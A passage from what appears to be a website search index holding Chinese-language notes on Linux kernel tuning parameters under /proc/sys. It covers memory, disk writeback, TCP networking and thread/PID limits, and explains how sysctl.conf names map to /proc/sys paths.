\u8fd9\u662f\u4e00\u4e2a\u201c\u795e\u5947\u201d\u7684\u7ec4\u5408\u952e\uff0c\u4f60\u53ef\u4ee5\u5411\u5b83\u8f93\u5165\u6307\u4ee4\uff0c\u5185\u6838\u4f1a\u5bf9\u5b83\u505a\u51fa\u54cd\u5e94 \u5185\u5b58\u76f8\u5173\uff1a /proc/sys/vm/swappiness swappiness\u7684\u503c\u7684\u5927\u5c0f\u5bf9\u5982\u4f55\u4f7f\u7528swap\u5206\u533a\u662f\u6709\u7740\u5f88\u5927\u7684\u8054\u7cfb\u7684\u3002swappiness=0\u7684\u65f6\u5019\u8868\u793a\u6700\u5927\u9650\u5ea6\u4f7f\u7528\u7269\u7406\u5185\u5b58\uff0c\u7136\u540e\u624d\u662f swap\u7a7a\u95f4\uff0cswappiness\uff1d100\u7684\u65f6\u5019\u8868\u793a\u79ef\u6781\u7684\u4f7f\u7528swap\u5206\u533a\uff0c\u5e76\u4e14\u628a\u5185\u5b58\u4e0a\u7684\u6570\u636e\u53ca\u65f6\u7684\u642c\u8fd0\u5230swap\u7a7a\u95f4\u91cc\u9762\u3002linux\u7684\u57fa\u672c\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a60 /proc/sys/vm/vfs_cache_pressure \u9ed8\u8ba4\u503c100\uff0c\u7528\u4e8e\u63a7\u5236\u56de\u6536cache\u9891\u7387\uff0c\u503c\u8d8a\u5c0f\u5219\u8d8a\u503e\u5411\u4e8e\u4fdd\u7559cache\uff0c0 \u8868\u793a\u4ece\u4e0d\u56de\u6536cache\u5bb9\u6613\u5bfc\u81f4out-of-memory /proc/sys/vm/min_free_kbytes \u8be5\u6587\u4ef6\u8868\u793a\u5f3a\u5236Linux VM\u6700\u4f4e\u4fdd\u7559\u591a\u5c11\u7a7a\u95f2\u5185\u5b58\uff08Kbytes\uff09\u3002 /proc/sys/vm/drop_caches \u9ed8\u8ba4\u4e3a0 \u8f93\u51651\u91ca\u653e\u9875\u7f13\u5b58cache\uff0c2\u91ca\u653e\u7d22\u5f15\u8282\u70b9\u548c\u76ee\u5f55\u9879\u7f13\u5b58\uff0c3\u91ca\u653e\u9875\u7f13\u5b58\u53ca\u7d22\u5f15\u8282\u70b9\u548c\u76ee\u5f55\u9879\u7f13\u5b58 /proc/sys/vm/overcommit_memory 0 0\u5141\u8bb8\u5229\u7528\u7b97\u6cd5\u5408\u7406\u7684\u8fc7\u5ea6\u5206\u914d\uff0c1\u503c\u5141\u8bb8\u8fc7\u5ea6\u5206\u914d\uff0c2\u7981\u6b62\u8fc7\u5ea6\u5206\u914d /proc/sys/vm/overcommit_ratio \u8fc7\u5ea6\u5206\u914d\u7684\u6bd4\u4f8b IO\u76f8\u5173\uff1a /proc/sys/vm/dirty_background_ratio \u8be5\u6587\u4ef6\u8868\u793a\u810f\u6570\u636e\u5230\u8fbe\u7cfb\u7edf\u6574\u4f53\u5185\u5b58\u7684\u767e\u5206\u6bd4\uff0c\u6b64\u65f6\u89e6\u53d1pdflush\u8fdb\u7a0b\u628a\u810f\u6570\u636e\u5199\u56de\u78c1\u76d8\u3002\u7f3a\u7701\u8bbe\u7f6e\uff1a10 \u5f53\u7528\u6237\u8c03\u7528write\u65f6\uff0c\u5982\u679c\u53d1\u73b0\u7cfb\u7edf\u4e2d\u7684\u810f\u6570\u636e\u5927\u4e8e\u8fd9\u9608\u503c\uff08\u6216dirty_background_bytes \uff09\uff0c\u4f1a\u89e6\u53d1pdflush\u8fdb\u7a0b\u53bb\u5199\u810f\u6570\u636e\uff0c\u4f46\u662f\u7528\u6237\u7684write\u8c03\u7528\u4f1a\u7acb\u5373\u8fd4\u56de\uff0c\u65e0\u9700\u7b49\u5f85\u3002pdflush\u5237\u810f\u9875\u7684\u6807\u51c6\u662f\u8ba9\u810f\u9875\u964d\u4f4e\u5230\u8be5\u9608\u503c\u4ee5\u4e0b\u3002\u5373\u4f7fcgroup\u9650\u5236\u4e86\u7528\u6237\u8fdb\u7a0b\u7684IOPS\uff0c\u4e5f\u65e0\u6240\u8c13\u3002 /proc/sys/vm/dirty_background_bytes \u63a7\u5236\u810f\u9875\u5185\u5b58\u6570\u91cf\uff0c\u8d85\u8fc7dirty_background_bytes\u65f6\uff0c\u5185\u6838\u7684flush\u7ebf\u7a0b\u5f00\u59cb\u56de\u5199\u810f\u9875 \u9ed8\u8ba4\u4e3a0 /proc/sys/vm/dirty_expire_centisecs \u8be5\u6587\u4ef6\u8868\u793a\u5982\u679c\u810f\u6570\u636e\u5728\u5185\u5b58\u4e2d\u9a7b\u7559\u65f6\u95f4\u8d85\u8fc7\u8be5\u503c\uff0cpdflush\u8fdb\u7a0b\u5728\u4e0b\u4e00\u6b21\u5c06\u628a\u8fd9\u4e9b\u6570\u636e\u5199\u56de\u78c1\u76d8\u3002\u7f3a\u7701\u8bbe\u7f6e\uff1a3000\uff081/100\u79d2\uff09 /proc/sys/vm/dirty_writeback_centisecs \u8be5\u6587\u4ef6\u8868\u793apdflush\u8fdb\u7a0b\u7684\u5524\u9192\u95f4\u9694\uff0c\u5468\u671f\u6027\u628a\u8d85\u8fc7dirty_expire_centisecs\u65f6\u95f4\u7684\u810f\u6570\u636e\u5199\u56de\u78c1\u76d8\u3002 \u7f3a\u7701\u8bbe\u7f6e\uff1a500\uff081/100\u79d2\uff09 /proc/sys/vm/dirty_ratio \u8be5\u6587\u4ef6\u8868\u793a\u5982\u679c\u8fdb\u7a0b\u4ea7\u751f\u7684\u810f\u6570\u636e\u5230\u8fbe\u7cfb\u7edf\u6574\u4f53\u5185\u5b58\u7684\u767e\u5206\u6bd4\uff0c\u6b64\u65f6\u7528\u6237\u8fdb\u7a0b\u81ea\u884c\u628a\u810f\u6570\u636e\u5199\u56de\u78c1\u76d8\u3002\u7f3a\u7701\u8bbe\u7f6e\uff1a40\u3002\u5f53\u7528\u6237\u8c03\u7528write\u65f6\uff0c\u5982\u679c\u53d1\u73b0\u7cfb\u7edf\u4e2d\u7684\u810f\u6570\u636e\u5927\u4e8e\u8fd9\u9608\u503c\uff08\u6216dirty_bytes \uff09\uff0c\u9700\u8981\u81ea\u5df1\u628a\u810f\u6570\u636e\u5237\u56de\u78c1\u76d8\uff0c\u964d\u4f4e\u5230\u8fd9\u4e2a\u9608\u503c\u4ee5\u4e0b\u624d\u8fd4\u56de\u3002\u6ce8\u610f\uff0c\u6b64\u65f6\u5982\u679ccgroup\u9650\u5236\u4e86\u7528\u6237\u8fdb\u7a0b\u7684IOPS\uff0c\u90a3\u5c31\u60b2\u5267\u4e86\u3002 /proc/sys/vm/dirty_bytes \u63a7\u5236\u810f\u9875\u5185\u5b58\u6570\u91cf\uff0c\u8fbe\u5230dirty_bytes\u65f6\uff0c\u6267\u884c\u78c1\u76d8\u5199\u64cd\u4f5c\u7684\u8fdb\u7a0b\u5f00\u59cb\u56de\u5199\u810f\u9875 /proc/sys/vm/nr_pdflush_threads \u7cfb\u7edf\u91cc\u901a\u5e38\u53ea\u80fd\u67092\uff5e8\u4e2apdflush\u8fdb\u7a0b\uff0c\u5f53\u524dpdflush\u8fdb\u7a0b\u4e2a\u6570\u53ef\u4ee5\u901a\u8fc7/proc/sys/vm/nr_pdflush_threads \u67e5\u770b\u3002\u5f53\u7cfb\u7edf\u5185\u5168\u90e8pdflush\u8fdb\u7a0b\u7e41\u5fd9\u8d85\u8fc71\u79d2\u540e\uff0c\u7cfb\u7edf\u4f1a\u542f\u52a8\u4e00\u65b0pdflush\u8fdb\u7a0b\u3002\u5f53\u8d85\u8fc7\u4e00\u79d2\u540e\uff0c\u7cfb\u7edf\u5f53\u524d\u5168\u90e8pdflush\u8fdb\u7a0b\u7a7a\u95f2\u65f6\uff0c\u7cfb\u7edf\u4f1a\u6740\u6b7b\u4e00\u4e2apdflush\u8fdb\u7a0b\u3002 \u7f51\u7edc\u76f8\u5173\uff1a /proc/sys/net/core/rmem_default \u9ed8\u8ba4\u7684TCP\u6570\u636e\u63a5\u6536\u7a97\u53e3\u5927\u5c0f\uff08\u5b57\u8282\uff09\u3002229376 /proc/sys/net/core/rmem_max \u6700\u5927\u7684TCP\u6570\u636e\u63a5\u6536\u7a97\u53e3\uff08\u5b57\u8282\uff09\u3002131071 /proc/sys/net/core/wmem_default \u9ed8\u8ba4\u7684TCP\u6570\u636e\u53d1\u9001\u7a97\u53e3\u5927\u5c0f\uff08\u5b57\u8282\uff09\u3002229376 /proc/sys/net/core/wmem_max \u6700\u5927\u7684TCP\u6570\u636e\u53d1\u9001\u7a97\u53e3\uff08\u5b57\u8282\uff09\u3002131071 /proc/sys/net/core/netdev_max_backlog \u5728\u6bcf\u4e2a\u7f51\u7edc\u63a5\u53e3\u63a5\u6536\u6570\u636e\u5305\u7684\u901f\u7387\u6bd4\u5185\u6838\u5904\u7406\u8fd9\u4e9b\u5305\u7684\u901f\u7387\u5feb\u65f6\uff0c\u5141\u8bb8\u9001\u5230\u961f\u5217\u7684\u6570\u636e\u5305\u7684\u6700\u5927\u6570\u76ee\u30021000 /proc/sys/net/core/somaxconn \u5b9a\u4e49\u4e86\u7cfb\u7edf\u4e2d\u6bcf\u4e00\u4e2a\u7aef\u53e3\u6700\u5927\u7684\u76d1\u542c\u961f\u5217\u7684\u957f\u5ea6\uff0c\u8fd9\u662f\u4e2a\u5168\u5c40\u7684\u53c2\u6570\u3002128 /proc/sys/net/core/optmem_max \u8868\u793a\u6bcf\u4e2a\u5957\u63a5\u5b57\u6240\u5141\u8bb8\u7684\u6700\u5927\u7f13\u51b2\u533a\u7684\u5927\u5c0f\u300220480 /proc/sys/net/ipv4/tcp_mem \u786e\u5b9aTCP\u6808\u5e94\u8be5\u5982\u4f55\u53cd\u6620\u5185\u5b58\u4f7f\u7528\uff0c\u6bcf\u4e2a\u503c\u7684\u5355\u4f4d\u90fd\u662f\u5185\u5b58\u9875\uff08\u901a\u5e38\u662f4KB\uff09\u3002\u7b2c\u4e00\u4e2a\u503c\u662f\u5185\u5b58\u4f7f\u7528\u7684\u4e0b\u9650\uff1b\u7b2c\u4e8c\u4e2a\u503c\u662f\u5185\u5b58\u538b\u529b\u6a21\u5f0f\u5f00\u59cb\u5bf9\u7f13\u51b2\u533a\u4f7f\u7528\u5e94\u7528\u538b\u529b \u7684\u4e0a\u9650\uff1b\u7b2c\u4e09\u4e2a\u503c\u662f\u5185\u5b58\u4f7f\u7528\u7684\u4e0a\u9650\u3002\u5728\u8fd9\u4e2a\u5c42\u6b21\u4e0a\u53ef\u4ee5\u5c06\u62a5\u6587\u4e22\u5f03\uff0c\u4ece\u800c\u51cf\u5c11\u5bf9\u5185\u5b58\u7684\u4f7f\u7528\u3002\u5bf9\u4e8e\u8f83\u5927\u7684BDP\u53ef\u4ee5\u589e\u5927\u8fd9\u4e9b\u503c\uff08\u6ce8\u610f\uff0c\u5176\u5355\u4f4d\u662f\u5185\u5b58\u9875\u800c\u4e0d\u662f\u5b57 \u8282\uff09\u300294011 125351 188022 /proc/sys/net/ipv4/tcp_rmem \u4e3a \u81ea\u52a8\u8c03\u4f18\u5b9a\u4e49socket\u4f7f\u7528\u7684\u5185\u5b58\u3002\u7b2c\u4e00\u4e2a\u503c\u662f\u4e3asocket\u63a5\u6536\u7f13\u51b2\u533a\u5206\u914d\u7684\u6700\u5c11\u5b57\u8282\u6570\uff1b\u7b2c\u4e8c\u4e2a\u503c\u662f\u9ed8\u8ba4\u503c\uff08\u8be5\u503c\u4f1a\u88abrmem_default\u8986 \u76d6\uff09\uff0c\u7f13\u51b2\u533a\u5728\u7cfb\u7edf\u8d1f\u8f7d\u4e0d\u91cd\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u589e\u957f\u5230\u8fd9\u4e2a\u503c\uff1b\u7b2c\u4e09\u4e2a\u503c\u662f\u63a5\u6536\u7f13\u51b2\u533a\u7a7a\u95f4\u7684\u6700\u5927\u5b57\u8282\u6570\uff08\u8be5\u503c\u4f1a\u88abrmem_max\u8986\u76d6\uff09\u30024096 87380 4011232 /proc/sys/net/ipv4/tcp_wmem \u4e3a\u81ea\u52a8\u8c03\u4f18\u5b9a\u4e49socket\u4f7f\u7528\u7684\u5185\u5b58\u3002\u7b2c\u4e00\u4e2a\u503c\u662f\u4e3asocket\u53d1\u9001\u7f13\u51b2\u533a\u5206\u914d\u7684\u6700\u5c11\u5b57\u8282\u6570\uff1b\u7b2c\u4e8c\u4e2a\u503c\u662f\u9ed8\u8ba4\u503c\uff08\u8be5\u503c\u4f1a\u88abwmem_default\u8986 \u76d6\uff09\uff0c\u7f13\u51b2\u533a\u5728\u7cfb\u7edf\u8d1f\u8f7d\u4e0d\u91cd\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u589e\u957f\u5230\u8fd9\u4e2a\u503c\uff1b\u7b2c\u4e09\u4e2a\u503c\u662f\u53d1\u9001\u7f13\u51b2\u533a\u7a7a\u95f4\u7684\u6700\u5927\u5b57\u8282\u6570\uff08\u8be5\u503c\u4f1a\u88abwmem_max\u8986\u76d6\uff09\u30024096 16384 4011232 /proc/sys/net/ipv4/tcp_keepalive_time TCP\u53d1\u9001keepalive\u63a2\u6d4b\u6d88\u606f\u7684\u95f4\u9694\u65f6\u95f4\uff08\u79d2\uff09\uff0c\u7528\u4e8e\u786e\u8ba4TCP\u8fde\u63a5\u662f\u5426\u6709\u6548\u3002 7200 \u9ed8\u8ba4\u4e3a2\u5c0f\u65f6\uff0c\u53ef\u4ee5\u6539\u621020\u5206\u949f /proc/sys/net/ipv4/tcp_keepalive_intvl \u63a2\u6d4b\u6d88\u606f\u672a\u83b7\u5f97\u54cd\u5e94\u65f6\uff0c\u91cd\u53d1\u8be5\u6d88\u606f\u7684\u95f4\u9694\u65f6\u95f4\uff08\u79d2\uff09\u300275 /proc/sys/net/ipv4/tcp_keepalive_probes \u5728\u8ba4\u5b9aTCP\u8fde\u63a5\u5931\u6548\u4e4b\u524d\uff0c\u6700\u591a\u53d1\u9001\u591a\u5c11\u4e2akeepalive\u63a2\u6d4b\u6d88\u606f\u30029 /proc/sys/net/ipv4/tcp_sack \u542f\u7528\u6709\u9009\u62e9\u7684\u5e94\u7b54\uff081\u8868\u793a\u542f\u7528\uff09\uff0c\u901a\u8fc7\u6709\u9009\u62e9\u5730\u5e94\u7b54\u4e71\u5e8f\u63a5\u6536\u5230\u7684\u62a5\u6587\u6765\u63d0\u9ad8\u6027\u80fd\uff0c\u8ba9\u53d1\u9001\u8005\u53ea\u53d1\u9001\u4e22\u5931\u7684\u62a5\u6587\u6bb5\uff0c\uff08\u5bf9\u4e8e\u5e7f\u57df\u7f51\u901a\u4fe1\u6765\u8bf4\uff09\u8fd9\u4e2a\u9009\u9879\u5e94\u8be5\u542f\u7528\uff0c\u4f46\u662f\u4f1a\u589e\u52a0\u5bf9CPU\u7684\u5360\u7528\u30021 /proc/sys/net/ipv4/tcp_fack \u542f\u7528\u8f6c\u53d1\u5e94\u7b54\uff0c\u53ef\u4ee5\u8fdb\u884c\u6709\u9009\u62e9\u5e94\u7b54\uff08SACK\uff09\u4ece\u800c\u51cf\u5c11\u62e5\u585e\u60c5\u51b5\u7684\u53d1\u751f\uff0c\u8fd9\u4e2a\u9009\u9879\u4e5f\u5e94\u8be5\u542f\u7528\u30021 /proc/sys/net/ipv4/tcp_timestamps TCP\u65f6\u95f4\u6233\uff08\u4f1a\u5728TCP\u5305\u5934\u589e\u52a012\u4e2a\u5b57\u8282\uff09\uff0c\u4ee5\u4e00\u79cd\u6bd4\u91cd\u53d1\u8d85\u65f6\u66f4\u7cbe\u786e\u7684\u65b9\u6cd5\uff08\u53c2\u8003RFC 1323\uff09\u6765\u542f\u7528\u5bf9RTT \u7684\u8ba1\u7b97\uff0c\u4e3a\u5b9e\u73b0\u66f4\u597d\u7684\u6027\u80fd\u5e94\u8be5\u542f\u7528\u8fd9\u4e2a\u9009\u9879\u30021 /proc/sys/net/ipv4/tcp_window_scaling \u542f\u7528RFC 1323\u5b9a\u4e49\u7684window scaling\uff0c\u8981\u652f\u6301\u8d85\u8fc764KB\u7684TCP\u7a97\u53e3\uff0c\u5fc5\u987b\u542f\u7528\u8be5\u503c\uff081\u8868\u793a\u542f\u7528\uff09\uff0cTCP\u7a97\u53e3\u6700\u5927\u81f31GB\uff0cTCP\u8fde\u63a5\u53cc\u65b9\u90fd\u542f\u7528\u65f6\u624d\u751f\u6548\u30021 /proc/sys/net/ipv4/tcp_syncookies \u8868\u793a\u662f\u5426\u6253\u5f00TCP\u540c\u6b65\u6807\u7b7e\uff08syncookie\uff09\uff0c\u5185\u6838\u5fc5\u987b\u6253\u5f00\u4e86CONFIG_SYN_COOKIES\u9879\u8fdb\u884c\u7f16\u8bd1\uff0c\u540c\u6b65\u6807\u7b7e\u53ef\u4ee5\u9632\u6b62\u4e00\u4e2a\u5957\u63a5\u5b57\u5728\u6709\u8fc7\u591a\u8bd5\u56fe\u8fde\u63a5\u5230\u8fbe\u65f6\u5f15\u8d77\u8fc7\u8f7d\u30021 \u8868\u793a\u5f00\u542fSYN Cookies\u3002\u5f53\u51fa\u73b0SYN\u7b49\u5f85\u961f\u5217\u6ea2\u51fa\u65f6\uff0c\u542f\u7528cookies\u6765\u5904\u7406\uff0c\u53ef\u9632\u8303\u5c11\u91cfSYN\u653b\u51fb\uff0c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u5173\u95ed /proc/sys/net/ipv4/tcp_tw_reuse \u8868\u793a\u662f\u5426\u5141\u8bb8\u5c06\u5904\u4e8eTIME-WAIT\u72b6\u6001\u7684socket\uff08TIME-WAIT\u7684\u7aef\u53e3\uff09\u7528\u4e8e\u65b0\u7684TCP\u8fde\u63a5 \u3002\u9ed8\u8ba4\u4e3a0\uff0c\u5efa\u8bae\u6253\u5f00\uff0c\u8bbe\u7f6e\u4e3a1 /proc/sys/net/ipv4/tcp_tw_recycle \u80fd\u591f\u66f4\u5feb\u5730\u56de\u6536TIME-WAIT\u5957\u63a5\u5b57\u3002\u8868\u793a\u5f00\u542fTCP\u8fde\u63a5\u4e2dTIME-WAIT sockets\u7684\u5feb\u901f\u56de\u6536\uff0c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u5173\u95ed\u3002 /proc/sys/net/ipv4/tcp_fin_timeout \u5bf9\u4e8e\u672c\u7aef\u65ad\u5f00\u7684socket\u8fde\u63a5\uff0cTCP\u4fdd\u6301\u5728FIN-WAIT-2\u72b6\u6001\u7684\u65f6\u95f4\uff08\u79d2\uff09\u3002\u5bf9\u65b9\u53ef\u80fd\u4f1a\u65ad\u5f00\u8fde\u63a5\u6216\u4e00\u76f4\u4e0d\u7ed3\u675f\u8fde\u63a5\u6216\u4e0d\u53ef\u9884\u6599\u7684\u8fdb\u7a0b\u6b7b\u4ea1\u3002\u9ed8\u8ba4\u503c\u4e3a60\uff0c\u5efa\u8bae\u4e3a30 /proc/sys/net/ipv4/ip_local_port_range \u8868\u793aTCP/UDP\u534f\u8bae\u5141\u8bb8\u4f7f\u7528\u7684\u672c\u5730\u7aef\u53e3\u53f7 \u9ed8\u8ba4\u4e3a 32768 61000 \u5efa\u8bae\u4fee\u6539\u4e3a 1024 65000 | /proc/sys/net/ipv4/tcp_max_syn_backlog \u5bf9\u4e8e\u8fd8\u672a\u83b7\u5f97\u5bf9\u65b9\u786e\u8ba4\u7684\u8fde\u63a5\u8bf7\u6c42\uff0c\u53ef\u4fdd\u5b58\u5728\u961f\u5217\u4e2d\u7684\u6700\u5927\u6570\u76ee\u3002\u5982\u679c\u670d\u52a1\u5668\u7ecf\u5e38\u51fa\u73b0\u8fc7\u8f7d\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u589e\u52a0\u8fd9\u4e2a\u6570\u5b57\u3002 \u8868\u793aSYN\u961f\u5217\u7684\u957f\u5ea6\uff0c\u9ed8\u8ba4\u4e3a1024\uff0c\u52a0\u5927\u961f\u5217\u957f\u5ea6\u4e3a8192\uff0c\u53ef\u4ee5\u5bb9\u7eb3\u66f4\u591a\u7b49\u5f85\u8fde\u63a5\u7684\u7f51\u7edc\u8fde\u63a5\u6570\u3002 /proc/sys/net/ipv4/tcp_low_latency \u5141\u8bb8TCP/IP\u6808\u9002\u5e94\u5728\u9ad8\u541e\u5410\u91cf\u60c5\u51b5\u4e0b\u4f4e\u5ef6\u65f6\u7684\u60c5\u51b5\uff0c\u8fd9\u4e2a\u9009\u9879\u5e94\u8be5\u7981\u7528\u30020 /proc/sys/net/ipv4/tcp_westwood \u542f\u7528\u53d1\u9001\u8005\u7aef\u7684\u62e5\u585e\u63a7\u5236\u7b97\u6cd5\uff0c\u5b83\u53ef\u4ee5\u7ef4\u62a4\u5bf9\u541e\u5410\u91cf\u7684\u8bc4\u4f30\uff0c\u5e76\u8bd5\u56fe\u5bf9\u5e26\u5bbd\u7684\u6574\u4f53\u5229\u7528\u60c5\u51b5\u8fdb\u884c\u4f18\u5316\uff0c\u5bf9\u4e8eWAN \u901a\u4fe1\u6765\u8bf4\u5e94\u8be5\u542f\u7528\u8fd9\u4e2a\u9009\u9879\u30020 /proc/sys/net/ipv4/tcp_bic \u4e3a\u5feb\u901f\u957f\u8ddd\u79bb\u7f51\u7edc\u542f\u7528Binary Increase Congestion\uff0c\u8fd9\u6837\u53ef\u4ee5\u66f4\u597d\u5730\u5229\u7528\u4ee5GB\u901f\u5ea6\u8fdb\u884c\u64cd\u4f5c\u7684\u94fe\u63a5\uff0c\u5bf9\u4e8eWAN\u901a\u4fe1\u5e94\u8be5\u542f\u7528\u8fd9\u4e2a\u9009\u9879\u30021 /proc/sys/net/ipv4/tcp_max_tw_buckets \u8868\u793a\u7cfb\u7edf\u540c\u65f6\u4fdd\u6301TIME_WAIT\u5957\u63a5\u5b57\u7684\u6700\u5927\u6570\u91cf\uff0c\u5982\u679c\u8d85\u8fc7\u8fd9\u4e2a\u6570\u5b57\uff0cTIME_WAIT\u5957\u63a5\u5b57\u5c06\u7acb\u523b\u88ab\u6e05\u9664\u5e76\u6253\u5370\u8b66\u544a\u4fe1\u606f\u3002\u9ed8\u8ba4\u4e3a180000\uff0c\u6539\u4e3a5000\u3002\u5bf9\u4e8eApache\u3001Nginx\u7b49\u670d\u52a1\u5668\uff0c\u4e0a\u51e0\u884c\u7684\u53c2\u6570\u53ef\u4ee5\u5f88\u597d\u5730\u51cf\u5c11TIME_WAIT\u5957\u63a5\u5b57\u6570\u91cf\uff0c\u4f46\u662f\u5bf9\u4e8e Squid\uff0c\u6548\u679c\u5374\u4e0d\u5927\u3002\u6b64\u9879\u53c2\u6570\u53ef\u4ee5\u63a7\u5236TIME_WAIT\u5957\u63a5\u5b57\u7684\u6700\u5927\u6570\u91cf\uff0c\u907f\u514dSquid\u670d\u52a1\u5668\u88ab\u5927\u91cf\u7684TIME_WAIT\u5957\u63a5\u5b57\u62d6\u6b7b\u3002","title":"\u5185\u6838\u53c2\u6570"},{"location":"system/linux/IO/%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0/#_1","text":"","title":"\u5185\u6838\u53c2\u6570"},{"location":"system/linux/IO/%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0/#etcsysctlconfprocsys","text":"\u4e0b\u9762\u4ecb\u7ecd\u4e00\u4e0b/proc/sys\u4e0b\u5185\u6838\u6587\u4ef6\u4e0e\u914d\u7f6e\u6587\u4ef6sysctl.conf\u4e2d\u53d8\u91cf\u7684\u5bf9\u5e94\u5173\u7cfb\uff1a \u7531\u4e8e\u53ef\u4ee5\u4fee\u6539\u7684\u5185\u6838\u53c2\u6570\u90fd\u5728/proc/sys\u76ee\u5f55\u4e0b\uff0c\u6240\u4ee5sysctl.conf\u7684\u53d8\u91cf\u540d\u7701\u7565\u4e86\u76ee\u5f55\u7684\u524d\u9762\u90e8\u5206\uff08/proc/sys\uff09\u3002 \u5373\u5c06/proc/sys\u4e2d\u7684\u6587\u4ef6\u8f6c\u6362\u6210sysctl\u4e2d\u7684\u53d8\u91cf\u4f9d\u636e\u4e0b\u9762\u4e24\u4e2a\u7b80\u5355\u7684\u89c4\u5219\uff1a \u53bb\u6389\u524d\u9762\u90e8\u5206/proc/sys \u5c06\u6587\u4ef6\u540d\u4e2d\u7684\u659c\u6760\u53d8\u4e3a\u70b9 \u8fd9\u4e24\u6761\u89c4\u5219\u53ef\u4ee5\u5c06/proc/sys\u4e2d\u7684\u4efb\u4e00\u6587\u4ef6\u540d\u8f6c\u6362\u6210sysctl\u4e2d\u7684\u53d8\u91cf\u540d\u3002 \u4f8b\u5982\uff1a /proc/sys/net/ipv4/ip_forward \uff1d\u300b net.ipv4.ip_forward /proc/sys/kernel/hostname \uff1d\u300b kernel.hostname \u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u547d\u4ee4\u67e5\u8be2\u6240\u6709\u53ef\u4fee\u6539\u7684\u53d8\u91cf\u540d sysctl \u2013a","title":"\u914d\u7f6e\u6587\u4ef6/etc/sysctl.conf\u548c/proc/sys\u4e0b\u5185\u6838\u6587\u4ef6\u7684\u5173\u7cfb"},{"location":"system/linux/IO/%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0/#_2","text":"/proc/sys/kernel/threads-max \u6700\u5927\u7ebf\u7a0b\u6570\u91cf\uff0c\u53ef\u5199\u5165\u7684\u6700\u5c0f\u503c\u4e3a20\u3002\u53ef\u5199\u5165\u7684\u6700\u5927\u503c\u7531\u5e38\u6570FUTEX_TID_MASK\uff080x3fffffff\uff09\u7ed9\u51fa\u3002\u5982\u679c\u5c06\u8d85\u51fa\u6b64\u8303\u56f4\u7684\u503c\u5199\u5165threads max\uff0c\u5219\u4f1a\u51fa\u73b0\u9519\u8befEINVAL /proc/sys/kernel/pid_max \u53ef\u5206\u914dPID\u7684\u6570\u91cf\uff0c\u56e0\u6b64\uff0c\u6b64\u6587\u4ef6\u7684\u503c\u8fd8\u5145\u5f53\u7cfb\u7edf\u8303\u56f4\u5185\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u603b\u6570\u7684\u9650\u5236\u3002\u572832\u4f4d\u5e73\u53f0\u4e0a\uff0c32768\u662fpid_max\u7684\u6700\u5927\u503c\u3002\u572864\u4f4d\u7cfb\u7edf\u4e0a\uff0cpid_max\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u6700\u5927\u4e3a2^22\u7684\u4efb\u4f55\u503c\uff08pid_max_LIMIT\uff0c\u7ea6400\u4e07\uff09\u3002 /usr/include/bits/local_lim.h _POSIX_THREAD_THREADS_MAX \u5355\u4e2a\u8fdb\u7a0b\u6700\u5927\u7ebf\u7a0b\u6570\u91cf /proc/sys/vm/max_map_count \u5355\u8fdb\u7a0b\u6700\u5927\u5206\u914dmap /proc/sys/kernel/watchdog_thresh Linux watchdog \u7684\u5f02\u5e38\u7b49\u5f85\u65f6\u95f4\u662f\u901a\u8fc7 /proc/sys/kernel/watchdog_thresh \u8bbe\u7f6e\u7684\uff0c\u4e00\u822c\u9ed8\u8ba4\u4e3a 60 \u79d2\u3002 /proc/sysrq-trigger \u8fd9\u662f\u4e00\u4e2a\u201c\u795e\u5947\u201d\u7684\u7ec4\u5408\u952e\uff0c\u4f60\u53ef\u4ee5\u5411\u5b83\u8f93\u5165\u6307\u4ee4\uff0c\u5185\u6838\u4f1a\u5bf9\u5b83\u505a\u51fa\u54cd\u5e94","title":"\u8ba1\u7b97\u76f8\u5173\uff1a"},{"location":"system/linux/IO/%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0/#_3","text":"/proc/sys/vm/swappiness swappiness\u7684\u503c\u7684\u5927\u5c0f\u5bf9\u5982\u4f55\u4f7f\u7528swap\u5206\u533a\u662f\u6709\u7740\u5f88\u5927\u7684\u8054\u7cfb\u7684\u3002swappiness=0\u7684\u65f6\u5019\u8868\u793a\u6700\u5927\u9650\u5ea6\u4f7f\u7528\u7269\u7406\u5185\u5b58\uff0c\u7136\u540e\u624d\u662f swap\u7a7a\u95f4\uff0cswappiness\uff1d100\u7684\u65f6\u5019\u8868\u793a\u79ef\u6781\u7684\u4f7f\u7528swap\u5206\u533a\uff0c\u5e76\u4e14\u628a\u5185\u5b58\u4e0a\u7684\u6570\u636e\u53ca\u65f6\u7684\u642c\u8fd0\u5230swap\u7a7a\u95f4\u91cc\u9762\u3002linux\u7684\u57fa\u672c\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a60 /proc/sys/vm/vfs_cache_pressure \u9ed8\u8ba4\u503c100\uff0c\u7528\u4e8e\u63a7\u5236\u56de\u6536cache\u9891\u7387\uff0c\u503c\u8d8a\u5c0f\u5219\u8d8a\u503e\u5411\u4e8e\u4fdd\u7559cache\uff0c0 \u8868\u793a\u4ece\u4e0d\u56de\u6536cache\u5bb9\u6613\u5bfc\u81f4out-of-memory /proc/sys/vm/min_free_kbytes \u8be5\u6587\u4ef6\u8868\u793a\u5f3a\u5236Linux VM\u6700\u4f4e\u4fdd\u7559\u591a\u5c11\u7a7a\u95f2\u5185\u5b58\uff08Kbytes\uff09\u3002 /proc/sys/vm/drop_caches \u9ed8\u8ba4\u4e3a0 \u8f93\u51651\u91ca\u653e\u9875\u7f13\u5b58cache\uff0c2\u91ca\u653e\u7d22\u5f15\u8282\u70b9\u548c\u76ee\u5f55\u9879\u7f13\u5b58\uff0c3\u91ca\u653e\u9875\u7f13\u5b58\u53ca\u7d22\u5f15\u8282\u70b9\u548c\u76ee\u5f55\u9879\u7f13\u5b58 /proc/sys/vm/overcommit_memory 0 